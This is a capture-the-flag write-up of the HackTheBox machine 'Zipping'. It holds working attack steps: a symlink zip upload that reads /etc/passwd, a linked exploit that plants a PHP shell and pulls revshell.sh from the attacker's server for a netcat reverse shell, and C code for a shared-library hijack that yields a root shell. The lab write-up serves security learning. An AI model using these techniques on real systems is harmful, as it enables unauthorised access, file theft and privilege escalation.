In the webapp we found an exploitable upload function in http://10.10.11.229/upload.php.
We can exploit through symbolic link files. For this we will create a symbolic link pdf file and compress it to zip

```bash
┌──(kali㉿kali)-[~/Documents/Boxes/Zipping-10.10.11.229]
└─$ ln -s ../../../../../../../../etc/passwd document.pdf

┌──(kali㉿kali)-[~/Documents/Boxes/Zipping-10.10.11.229]
└─$ zip --symlinks passwd.zip document.pdf
  adding: document.pdf (stored 0%)
```
  
Then we can upload the zip file and we will see the content in the request

![[Pasted image 20231115113420.png]]

In this way we retrieve the user flag. Now we tried fuzzing important files but nothing came. We found another exploitable vulnerability in http://10.10.11.229/shop/index.php to exploit with **[this exploit](https://raw.githubusercontent.com/saoGITo/HTB_Zipping/main/HTB_Zipping_poc.py)

```bash
┌──(kali㉿kali)-[~/Documents/Boxes/Zipping-10.10.11.229]
└─$ python3 HTB_Zipping_poc.py 10.10.14.23 9001
[+] Please run nc in other terminal: rlwrap -cAr nc -nvlp 9001
[+] Write php shell /var/lib/mysql/rvsl5815.php
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
[+] Get Reverse Shell
10.10.11.229 - - [15/Nov/2023 14:08:47] "GET /revshell.sh HTTP/1.1" 200 -

--------------

┌──(kali㉿kali)-[/usr/share/seclists/Fuzzing/LFI]
└─$ nc -nvlp 9001
listening on [any] 9001 ...
connect to [10.10.14.23] from (UNKNOWN) [10.10.11.229] 51768
bash: cannot set terminal process group (1151): Inappropriate ioctl for device
bash: no job control in this shell

rektsu@zipping:/var/www/html/shop$ whoami
rektsu
```

Once we got a shell, we find that we can execute the binary stock with sudo privileges

```bash
rektsu@zipping:/tmp$ sudo -l
Matching Defaults entries for rektsu on zipping:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User rektsu may run the following commands on zipping:
    (ALL) NOPASSWD: /usr/bin/stock
rektsu@zipping:/tmp$ sudo /usr/bin/stock
Enter the password: ^C
```

But the binary file is asking for a password. We can check the strings of the binary and find some info

```bash
rektsu@zipping:/tmp$ strings /usr/bin/stock 
[...SNIP...]
Hakaize
St0ckM4nager
/root/.stock.csv
Enter the password: 
Invalid password, please try again.
[...SNIP...]
```

We try with St0ckM4nager and it works

```bash
rektsu@zipping:/tmp$ sudo /usr/bin/stock    
Enter the password: St0ckM4nager

================== Menu ==================

1) See the stock
2) Edit the stock
3) Exit the program

```

Now with strace we can study the execution of the binary

```bash
rektsu@zipping:/tmp$ strace /usr/bin/stock 

[...SNIP...]

write(1, "Enter the password: ", 20Enter the password: )    = 20
read(0, St0ckM4nager
"St0ckM4nager\n", 1024)         = 13
openat(AT_FDCWD, "/home/rektsu/.config/libcounter.so", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
write(1, "\n================== Menu ======="..., 44
================== Menu ==================
) = 44
write(1, "\n", 1
)                       = 1
write(1, "1) See the stock\n", 171) See the stock
)      = 17
write(1, "2) Edit the stock\n", 182) Edit the stock
)     = 18
write(1, "3) Exit the program\n", 203) Exit the program
)   = 20
write(1, "\n", 1
)                       = 1
write(1, "Select an option: ", 18Select an option: )      = 18
read(0,
```

It is trying to execute file `/home/rektsu/.config/libcounter.so` but is missing, lets try to bypass the library. Following the `Linux Privilege Escalation` module of HTB Academy (`Shared Libraries` section) we can spawn a root bash with the following code

```C
#include <stdio.h> 
#include <sys/types.h> 
#include <stdlib.h> 

void _init() { 
	unsetenv("LD_PRELOAD"); 
	setgid(0); 
	setuid(0); 
	system("/bin/bash"); 
}
```

We compile and execute and we are root

```bash
rektsu@zipping:/tmp$ cd /home/rektsu/.config/

rektsu@zipping:/tmp$ gcc -fPIC -shared -o libcounter.so root.c -nostartfiles
root.c: In function ‘_init’:
root.c:7:4: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
    7 |    setgid(0);
      |    ^~~~~~
root.c:8:4: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
    8 |    setuid(0);
      |    ^~~~~~
      
rektsu@zipping:/home/rektsu/.config$ sudo /usr/bin/stock
Enter the password: St0ckM4nager

root@zipping:/home/rektsu/.config# whoami
root
```
